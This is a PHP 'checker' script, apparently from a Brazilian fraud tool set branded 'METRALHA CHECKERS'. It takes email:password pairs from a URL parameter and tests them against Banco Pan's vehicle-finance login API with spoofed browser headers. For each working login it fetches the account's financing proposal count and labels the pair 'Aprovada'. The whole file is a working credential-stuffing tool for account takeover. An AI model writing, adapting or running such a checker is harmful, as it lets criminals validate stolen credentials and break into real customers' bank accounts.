<?php



// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================

    
    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $email = multiexplode(array(":", "|", ""), $lista)[0];
    $senha = multiexplode(array(":", "|", ""), $lista)[1];
    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
}
    function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}
    function novoBypass($length = 16) {
    $characters = '66c4aacab43222d7';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


$metralhagostoso = substr($lista, 0, 8);

if (($metralhagostoso == 'Aprovada') or ($metralhagostoso == 'Aprovado')!== false) {

    die(json_encode(array("Error" => "Vai se foder kkkkkkk.", "Mensagemdometralha" => "Aqui nao amador...!")));

}

$contador_caracteres = strlen($lista);

if ($contador_caracteres < 3 ) {

    die('#Error => Invalido. Numero de caracteres abaixo do especificado..! [Digitados: '.$contador_caracteres.']');

}




$link_request = "https://api-shared.bancopan.com.br/prd/veiculos/autenticacao/v3/oauth/token";

$metraia_post = '{"grant_type":"password","response_type":"id_token","username":"'.$email.'","password":"'.$senha.'","persist":false,"changePassword":false}';


$header_request = array (

'accept: application/json, text/plain, */*',
'content-type: application/json',
'origin: https://veiculos.bancopan.com.br',
'referer: https://veiculos.bancopan.com.br/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.122 Safari/537.36'


);



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_request);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_request);
curl_setopt($ini, CURLOPT_POSTFIELDS, $metraia_post);
$request = curl_exec($ini);
$tokenzinhu = metraiapuxar($request, '"access_token":"','"', 1);


$tipo_conta = metraiapuxar($request, '"scope":"','"', 1);

if (empty($tipo_conta)!== false ) {

    $type_conta = "Nao obtive, resultados.!";

} else {

    $type_conta = ''.$tipo_conta.'';

}


$link_propostas = "https://api-shared.bancopan.com.br/prd/veiculos/proposta/v3/acompanhamento/proposta";

$metraia_propostas = '{"pagina":1,"paginacao":9,"status":"TODOS","data":{"inicio":"2022-11-12","fim":"2022-12-11"}}';


$header_propostas = array (

'accept: application/json, text/plain, */*',
'authorization: Bearer '.$tokenzinhu.'',
'content-type: application/json',
'origin: https://veiculos.bancopan.com.br',
'referer: https://veiculos.bancopan.com.br/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.122 Safari/537.36'


);



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_propostas);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_propostas);
curl_setopt($ini, CURLOPT_POSTFIELDS, $metraia_propostas);
$propostas = curl_exec($ini);



$total_propostas = metraiapuxar($propostas, '"total":',',', 1);

if (empty($total_propostas)!== false ) {

    $check_propostas = "Nao obtive, resultados.!";

} else if ($total_propostas == '0') {

    $check_propostas = "Sem propostas.";

} else {

    $check_propostas = ''.$total_propostas.'';

}



$msg_retorno = metraiapuxar($request, '"message":"','"', 1);
$code_retornoerror = metraiapuxar($request, '"errors":[{"code":',',', 1);



if (empty($msg_retorno)!== false ) {

    $retorno = "Nao obtive, resultados.!";

} else {

    $retorno = ''.$msg_retorno.'';

}

if (empty($code_retornoerror)!== false ) {

    $code_retorno = "Nao obtive, resultados.!";

} else {

    $code_retorno = ''.$code_retornoerror.'';
    
}




//$links = substr_count($links_create, 'title');


// ================ // ====================//==========================//============================= // ================================//=================//



// ================ // ====================//==========================//============================= // ================================//=================//
         

if (strpos($request, '"type":"error"')!== false ) {


   echo "<span class='badge badge-danger'>#Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> ($code_retorno) - $retorno <br>";


} else if (empty($request)!== false ) {


    echo "<span class='badge badge-danger'>#Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> N/A - Resultados. <br>";


}

else {

    echo "<span class='badge badge-success'>#Aprovada</span> $email|$senha  <span class='badge badge-info'>RETORNO:</span> Autenticado. ($type_conta) <span class='badge badge-info'>PROPOSTAS (FINANCIAMENTOS):</span> $check_propostas  <br>";

 
}
?>